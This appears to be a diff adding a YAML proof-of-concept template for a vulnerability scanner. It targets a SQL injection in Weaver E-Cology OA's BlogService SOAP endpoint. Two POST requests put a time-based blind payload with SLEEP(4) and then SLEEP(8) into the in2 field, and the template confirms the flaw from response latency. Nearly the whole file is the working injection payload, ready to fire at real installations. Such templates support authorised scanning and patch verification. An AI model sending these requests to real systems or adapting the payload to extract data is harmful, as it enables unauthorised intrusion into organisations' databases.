@@ -1,0 +1,56 @@
+name: poc-yaml-WeaverOA-E-Cology-BlogService-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/BlogService
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: text/xml;charset=UTF-8
+      body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:sendSubmitRemind>
+              <!--type: string-->
+              <web:in0>1</web:in0>
+              <!--type: string-->
+              <web:in1>2</web:in1>
+              <!--type: string-->
+              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(4)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
+            </web:sendSubmitRemind>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: POST
+      path: /services/BlogService
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+        Content-Type: text/xml;charset=UTF-8
+      body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:sendSubmitRemind>
+              <!--type: string-->
+              <web:in0>1</web:in0>
+              <!--type: string-->
+              <web:in1>2</web:in1>
+              <!--type: string-->
+              <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(8)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
+            </web:sendSubmitRemind>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1() 
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486868&idx=1&sn=03412f27928252b4cd115725ac5e72a4&chksm=c267b8a7f51031b1538c01d421b3abc3bc8b6296f0298507e6566483c600f432c7d2c1ebc175&token=522460222&lang=zh_CN#rd
+
+
